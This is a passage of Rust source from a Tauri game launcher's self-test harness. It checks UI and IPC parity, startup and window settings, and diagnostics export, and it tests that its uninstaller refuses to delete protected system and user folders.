    fs::create_dir_all(&wal_dir).map_err(|e| e.to_string())?;
    let _ = crate::lib_store::flush_wal_on_shutdown(&wal_dir)?;

    let exe = Path::new("C:\\Program Files\\Duke Launcher\\duke-launcher.exe");
    let run_tray = crate::app_system::format_startup_run_command(exe, true);
    let (enabled, tray) = crate::app_system::parse_startup_run_value(Some(&run_tray));
    if !enabled || !tray {
        return Err("Startup Run command formatting/parsing failed.".to_string());
    }

    let clamped = crate::app_system::clamp_window_geometry_to_work_area(
        crate::app_system::SavedWindowGeometry {
            width: 1360,
            height: 860,
            x: Some(-9000),
            y: Some(5000),
            maximized: false,
        },
        crate::app_system::MonitorWorkArea {
            left: 0,
            top: 0,
            right: 1920,
            bottom: 1040,
        },
        false,
    );
    if clamped.x.unwrap_or(-1) < 0
        || clamped.y.unwrap_or(-1) < 0
        || clamped.width > 1920
        || clamped.height > 1040
    {
        return Err("Multi-monitor work-area clamping failed.".to_string());
    }

    let diag = crate::app_system::export_diagnostics_bundle_sync()?;
    if !Path::new(&diag.zip_path).is_file() || diag.size_bytes < 64 {
        return Err("Diagnostics bundle (.zip) export failed.".to_string());
    }

    Ok("Steam XML CDATA/entity parser, v2 API fallback, friends diagnostics, cache clear, WAL flush, Startup Run, and diagnostics ZIP verified.".to_string())
}

pub fn verify_frontend_views_themes_and_ipc() -> Result<String, String> {
    let Some((launcher_dir, tauri_dir)) = resolve_workspace_launcher_dirs() else {
        return Ok("Source tree not adjacent to binary; skipped static UI parity scan.".to_string());
    };
    let index_html = fs::read_to_string(launcher_dir.join("src").join("index.html"))
        .map_err(|e| format!("Failed reading index.html: {e}"))?;
    let styles_css = fs::read_to_string(launcher_dir.join("src").join("styles.css"))
        .map_err(|e| format!("Failed reading styles.css: {e}"))?;
    let api_js = fs::read_to_string(launcher_dir.join("src").join("api.js"))
        .map_err(|e| format!("Failed reading api.js: {e}"))?;
    let main_js = fs::read_to_string(launcher_dir.join("src").join("main.js"))
        .map_err(|e| format!("Failed reading main.js: {e}"))?;
    let virtual_grid_js = fs::read_to_string(launcher_dir.join("src").join("virtual_grid.js"))
        .map_err(|e| format!("Failed reading virtual_grid.js: {e}"))?;
    let main_rs = fs::read_to_string(tauri_dir.join("src").join("main.rs"))
        .map_err(|e| format!("Failed reading main.rs: {e}"))?;
    let tauri_conf = fs::read_to_string(tauri_dir.join("tauri.conf.json"))
        .map_err(|e| format!("Failed reading tauri.conf.json: {e}"))?;

    // 1. Version & Window Safety Checks
    if !index_html.contains("2.3.2") || !tauri_conf.contains("\"2.3.2\"") {
        return Err("Expected v2.3.2 marker missing in index.html or tauri.conf.json.".to_string());
    }

    let default_sites = crate::sites::default_search_sites();
    if default_sites.len() != 8
        || default_sites
            .iter()
            .any(|s| s.home_url.to_ascii_lowercase().contains("vimm") || s.name.to_ascii_lowercase().contains("vimm"))
    {
        return Err("Default search sites failed legal 8-directory compliance check.".to_string());
    }
    let conf_json: serde_json::Value =
        serde_json::from_str(&tauri_conf).map_err(|e| format!("Invalid tauri.conf.json: {e}"))?;
    let main_win_transparent = conf_json["app"]["windows"]
        .as_array()
        .and_then(|arr| arr.iter().find(|w| w["label"] == "main"))
        .and_then(|w| w["transparent"].as_bool())
        .unwrap_or(true);
    if main_win_transparent {
        return Err("Main window in tauri.conf.json must keep \"transparent\": false.".to_string());
    }

    // 2. Views, Modals, and All 10 Solid Themes
    for view_id in [
        "library-view",
        "game-detail-view",
        "catalog-view",
        "downloader-view",
        "sources-view",
        "settings-view",
    ] {
        if !index_html.contains(&format!("id=\"{view_id}\"")) {
            return Err(format!("Missing view section #{view_id} in index.html"));
        }
    }
    for modal_id in [
        "details-modal",
        "restore-save-modal",
        "catalog-detail-modal",
        "add-site-modal",
        "bulk-import-modal",
        "snapshots-modal",
        "preflight-modal",
        "emu-install-prompt-modal",
        "clean-uninstall-modal",
        "coop-stream-modal",
    ] {
        if !index_html.contains(&format!("id=\"{modal_id}\"")) {
            return Err(format!("Missing modal #{modal_id} in index.html"));
        }
    }
    for theme in [
        "dark", "light", "minecraft", "sunset", "aerospace", "cyberpunk", "terminal", "crimson",
        "ocean", "frost",
    ] {
        if !styles_css.contains(&format!("body[data-theme=\"{theme}\"]")) {
            return Err(format!("Missing CSS theme definition [data-theme=\"{theme}\"]"));
        }
    }
    if !virtual_grid_js.contains("class VirtualCardGrid")
        || !main_js.contains("VirtualCardGrid")
        || !styles_css.contains(".virtual-grid-window")
    {
        return Err("Missing v2.2.0 VirtualCardGrid or virtual-grid CSS wiring.".to_string());
    }

    // 3. Inline SVG Sprite Integrity
    let mut symbol_ids = HashSet::new();
    let mut rest = index_html.as_str();
    while let Some(pos) = rest.find("<symbol id=\"") {
        let after = &rest[pos + 12..];
        if let Some(end) = after.find('"') {
            symbol_ids.insert(after[..end].to_string());
            rest = &after[end + 1..];
        } else {
            break;
        }
    }
    for source in [&index_html, &main_js, &virtual_grid_js] {
        let mut cursor = source.as_str();
        while let Some(pos) = cursor.find("href=\"#icon-") {
            let after = &cursor[pos + 7..];
            if let Some(end) = after.find('"') {
                let sym = &after[..end];
                if !symbol_ids.contains(sym) {
                    return Err(format!("SVG <use href=\"#{sym}\"> has no matching <symbol> in index.html"));
                }
                cursor = &after[end + 1..];
            } else {
                break;
            }
        }
    }

    // 4. DOM ID Parity (el("...") in main.js + virtual_grid.js vs id="..." in index.html)
    let mut html_ids = HashSet::new();
    let mut id_cursor = index_html.as_str();
    while let Some(pos) = id_cursor.find("id=\"") {
        let after = &id_cursor[pos + 4..];
        if let Some(end) = after.find('"') {
            html_ids.insert(after[..end].to_string());
            id_cursor = &after[end + 1..];
        } else {
            break;
        }
    }
    for js_id in extract_quoted_args(&main_js, "el(")
        .into_iter()
        .chain(extract_quoted_args(&virtual_grid_js, "el("))
    {
        if !html_ids.contains(&js_id) {
            return Err(format!("JS calls el(\"{js_id}\") but id=\"{js_id}\" is missing from index.html"));
        }
    }

    // 5. Tauri IPC Parity (invokeCommand("...") in api.js vs generate_handler![] in main.rs)
    let handler_start = main_rs
        .find("tauri::generate_handler![")
        .ok_or_else(|| "Missing tauri::generate_handler! in main.rs".to_string())?;
    let handler_block = &main_rs[handler_start..];
    let handler_end = handler_block
        .find("])")
        .ok_or_else(|| "Unterminated tauri::generate_handler! block".to_string())?;
    let registered_slice = &handler_block[..handler_end];
    let invoke_cmds = extract_quoted_args(&api_js, "invokeCommand(");
    if invoke_cmds.is_empty() {
        return Err("No invokeCommand() calls found in api.js".to_string());
    }
    for cmd in &invoke_cmds {
        if !registered_slice.contains(cmd) {
            return Err(format!("api.js calls invokeCommand(\"{cmd}\") not registered in generate_handler![]"));
        }
    }

    for required_hook in [
        "clearControllerFocus",
        "gamepaddisconnected",
        "toggleCouchMode",
        "closeTopmostUiLayer",
        "__dukeUnloading",
        "modalGen",
        "loadSteamMiniProfile",
        "steam-profile-updated",
    ] {
        if !main_js.contains(required_hook) {
            return Err(format!(
                "main.js missing required controller/state hygiene symbol `{required_hook}`"
            ));
        }
    }
    if !api_js.contains("__dukeUnloading") {
        return Err("api.js missing required window.__dukeUnloading shutdown guard.".to_string());
    }

    Ok(format!(
        "Verified v2.3.2: 6 views, 10 modals, 10 themes, VirtualCardGrid, {} SVG symbols, {} DOM IDs checked, {} IPC commands registered.",
        symbol_ids.len(),
        html_ids.len(),
        invoke_cmds.len()
    ))
}

fn case_filesystem_safety_protected_paths() -> Result<String, String> {
    let user_root = PathBuf::from("C:\\").join("Users").join("Player");
    let public_desktop = PathBuf::from("C:\\").join("Users").join("Public").join("Desktop");
    let must_reject = vec![
        PathBuf::from("C:\\"),
        PathBuf::from("D:\\"),
        user_root.clone(),
        user_root.join("Desktop"),
        user_root.join("Desktop").join("Game.lnk"),
        public_desktop,
        user_root.join("Downloads"),
        user_root.join("Documents"),
        user_root.join("AppData").join("Roaming"),
        user_root.join("AppData").join("Local").join("ModrinthApp"),
        PathBuf::from("C:\\Program Files (x86)\\Steam\\steamapps\\common"),
        PathBuf::from("C:\\Program Files\\Epic Games"),
        PathBuf::from("D:\\XboxGames"),
        PathBuf::from("D:\\Emulators\\RetroArch"),
    ];
    for p in &must_reject {
        if !crate::uninstaller::is_protected_user_or_system_path(p) {
            return Err(format!(
                "is_protected_user_or_system_path failed to reject protected path '{}'",
                p.display()
            ));
        }
        if crate::uninstaller::clean_uninstall_in_dirs(p, &[], None).is_ok() {
            return Err(format!(
                "clean_uninstall_in_dirs unexpectedly allowed protected path '{}'",
                p.display()
            ));
        }
    }
    Ok(format!(
        "Protected-path guard rejected all {} critical drive/user/launcher roots cleanly.",
        must_reject.len()
    ))
}

/// Runs the full deterministic chaos & integration stress harness cleanly inside isolated temp folders.
pub fn run_chaos_stress_harness_sync(check_ui_contract: bool) -> StressHarnessReport {
    let started = Instant::now();
    let temp_root = match unique_stress_dir("suite") {
        Ok(d) => d,
        Err(err) => {
            return StressHarnessReport {
                version: env!("CARGO_PKG_VERSION").to_string(),
                total_cases: 1,
                passed_cases: 0,
                failed_cases: 1,
                elapsed_ms: 0,
                cases: vec![ChaosCaseResult {
                    name: "create_temp_workspace".to_string(),
                    passed: false,
                    elapsed_ms: 0,
                    detail: err,
                }],
            };
        }
    };

    let mut cases = vec![
        run_case("corrupt_zip_archive_recovery", || {
            case_corrupt_zip_recovery(&temp_root)
        }),
        run_case("multidisc_cue_bin_grouping", || {
            case_multidisc_cue_bin_grouping(&temp_root)
        }),
        run_case("bios_hash_mismatch_and_missing", || {
            case_bios_hash_mismatch_and_missing(&temp_root)
        }),
        run_case(
            "disabled_projfs_and_platform_fallback",
            case_disabled_projfs_and_platform_fallback,
        ),
        run_case("malformed_json_bak_and_catalog_recovery", || {
            case_malformed_json_and_catalog_recovery(&temp_root)
        }),
        run_case("crash_0xc000007b_and_malformed_pe", || {
            case_0xc000007b_crash_diagnosis_and_pe(&temp_root)
        }),
        run_case("direct_storage_bler_bc1_corrupt_rejection", || {
            case_bler_texture_conditioning_and_corruption(&temp_root)
        }),
        run_case(
            "wasm_sandbox_and_fse_safety_guard",
            case_wasm_sandbox_and_fse_safety,
        ),
        run_case(
            "controller_disconnect_and_mode_exit_state_hygiene",
            case_controller_disconnect_and_mode_exit_state_hygiene,
        ),
        run_case("self_heal_v2_unclean_recovery", || {
            case_self_heal_v2_unclean_recovery(&temp_root)
        }),
        run_case("archive_native_zip_slip_rejection", || {
            case_archive_native_zip_slip_rejection(&temp_root)
        }),
        run_case("lib_store_wal_recovery_and_compaction", || {
            case_lib_store_wal_recovery(&temp_root)
        }),
        run_case("rom_shrink_chd_compress_and_verify", || {
            case_rom_shrink_and_verify_roundtrip(&temp_root)
        }),
        run_case("discord_ipc_desktop_chord_and_save_watcher", || {
            case_discord_ipc_desktop_chord_and_save_watcher(&temp_root)
        }),
        run_case("redist_cleaner_cas_reclaim", || {
            case_redist_cleaner_cas_reclaim(&temp_root)
        }),
        run_case("minimize_settings_and_updater_sanity", || {
            case_minimize_settings_and_updater_sanity(&temp_root)
        }),
        run_case("steam_mini_profile_and_app_system_features", || {
            case_steam_mini_profile_and_app_system(&temp_root)
        }),
        run_case(
            "filesystem_safety_protected_path_guards",
            case_filesystem_safety_protected_paths,
        ),
    ];

    if check_ui_contract {
        cases.push(run_case(
            "frontend_views_modals_10themes_svg_ipc_parity",
            verify_frontend_views_themes_and_ipc,
        ));
    }

    let _ = fs::remove_dir_all(&temp_root);

    let total_cases = cases.len();
    let passed_cases = cases.iter().filter(|c| c.passed).count();
    let failed_cases = total_cases.saturating_sub(passed_cases);

    StressHarnessReport {
        version: env!("CARGO_PKG_VERSION").to_string(),
        total_cases,
        passed_cases,
        failed_cases,
        elapsed_ms: started.elapsed().as_millis() as u64,
        cases,
    }
}

pub fn run_cli_stress_test() -> Result<(), String> {
    let report = run_chaos_stress_harness_sync(true);
    println!(
        "=== Duke Launcher v{} Chaos & Integration Stress Harness ({}/{} passed in {} ms) ===",
        report.version, report.passed_cases, report.total_cases, report.elapsed_ms
    );
    for c in &report.cases {
        println!(
            "[{}] {} ({} ms) - {}",
            if c.passed { "PASS" } else { "FAIL" },
            c.name,
            c.elapsed_ms,
            c.detail
        );
    }
    if report.failed_cases > 0 {
        Err(format!(
            "{} chaos stress case(s) failed.",
            report.failed_cases
        ))
    } else {
        Ok(())
    }
}

#[tauri::command]
pub async fn run_chaos_stress_harness() -> Result<StressHarnessReport, String> {
    tokio::task::spawn_blocking(|| run_chaos_stress_harness_sync(true))
        .await
        .map_err(|e| format!("Stress harness task failed: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chaos_stress_harness_passes_all_cases_zero_panics() {
        let report = run_chaos_stress_harness_sync(true);
        for case in &report.cases {
            assert!(
                case.passed,
                "Chaos stress case '{}' failed: {}",
                case.name, case.detail
            );
        }
        assert_eq!(report.failed_cases, 0);
        assert_eq!(report.passed_cases, 19);
    }
}
